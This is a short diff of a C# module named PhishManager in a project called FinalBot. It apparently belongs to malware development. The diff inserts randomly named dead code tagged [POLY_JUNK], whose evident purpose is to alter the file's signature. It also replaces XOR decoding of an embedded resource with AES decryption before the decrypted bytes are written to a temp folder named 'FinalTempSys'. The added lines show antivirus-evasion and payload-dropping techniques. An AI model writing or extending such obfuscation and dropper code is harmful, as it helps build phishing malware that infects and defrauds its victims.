@@ -1,13 +1,21 @@
 using System;
 using System.IO;
 using System.Reflection;
+using VanguardCore;
 using System.Diagnostics;
 using System.Threading.Tasks;
+using VanguardCore;
 
 namespace FinalBot.Modules
 {
     public static class PhishManager
     {
+        // [POLY_JUNK]
+        private static void _vanguard_e233e047() {
+            int val = 24189;
+            if (val > 50000) Console.WriteLine("Hash:" + 24189);
+        }
+
         private static readonly string _tempDir = Path.Combine(Path.GetTempPath(), "FinalTempSys");
 
         private static void EnsureTempDir()
@@ -41,9 +49,8 @@ namespace FinalBot.Modules
                         using (MemoryStream ms = new MemoryStream())
                         {
                             stream.CopyTo(ms);
-                            byte[] bytes = ms.ToArray();
-                            for (int i = 0; i < bytes.Length; i++) bytes[i] ^= VanguardCore.Constants.RESOURCE_XOR_KEY;
-                            File.WriteAllBytes(outPath, bytes);
+                            byte[] decrypted = AesHelper.Decrypt(ms.ToArray());
+                            if (decrypted != null) File.WriteAllBytes(outPath, decrypted);
                         }
                     }
                     else
